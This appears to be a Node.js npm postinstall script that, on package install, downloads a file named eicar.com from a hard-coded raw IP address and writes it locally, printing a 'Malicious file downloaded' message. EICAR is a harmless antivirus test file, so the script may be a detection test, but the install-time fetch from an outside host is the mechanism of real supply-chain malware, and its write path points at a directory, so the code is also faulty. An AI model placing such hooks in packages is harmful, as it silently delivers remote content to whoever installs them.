// postinstall.js
const http = require('http'); // or 'https' if needed
const fs = require('fs');

const remoteFileUrl = 'http://164.90.129.225/eicar.com';
const localFilePath = './';

// Attempt to download the file on install
http.get(remoteFileUrl, (response) => {
  // Create a write stream where we’ll save the downloaded file
  const fileStream = fs.createWriteStream(localFilePath);
  
  // Pipe the response data into our write stream
  response.pipe(fileStream);

  fileStream.on('finish', () => {
    fileStream.close(() => {
      console.log(`Malicious file downloaded as: ${localFilePath}`);
    });
  });
}).on('error', (err) => {
  console.error(`Download failed: ${err.message}`);
});
